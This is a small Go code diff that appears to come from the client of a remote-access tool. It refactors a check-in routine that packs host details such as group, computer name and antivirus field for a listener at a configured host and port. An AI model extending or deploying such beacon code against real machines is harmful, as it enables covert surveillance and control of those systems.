@@ -55,7 +55,7 @@ func SendInfo() []byte {
 	msgpack.ForcePathObject("AV").SetAsString("NULL")
 	msgpack.ForcePathObject("CLRVersion").SetAsString("1.0")
 	msgpack.ForcePathObject("Group").SetAsString(PcInfo.GroupInfo)
-	msgpack.ForcePathObject("ClientComputer").SetAsString(GetClientComputer())
+	msgpack.ForcePathObject("ClientComputer").SetAsString(PcInfo.ClientComputer)
 	//println(string(msgpack.Encode2Bytes()))
 	msgpack.ForcePathObject("WANip").SetAsString("0.0.0.0")
 	return msgpack.Encode2Bytes()
@@ -149,6 +149,7 @@ func main() {
 	PcInfo.Host = strings.ReplaceAll(Host, " ", "")
 	PcInfo.Port = strings.ReplaceAll(Port, " ", "")
 	PcInfo.ListenerName = strings.ReplaceAll(ListenerName, " ", "")
+	PcInfo.ClientComputer = GetClientComputer()
 	///Debug
 	// Host := "192.168.1.250"
 	// Port := "5000"
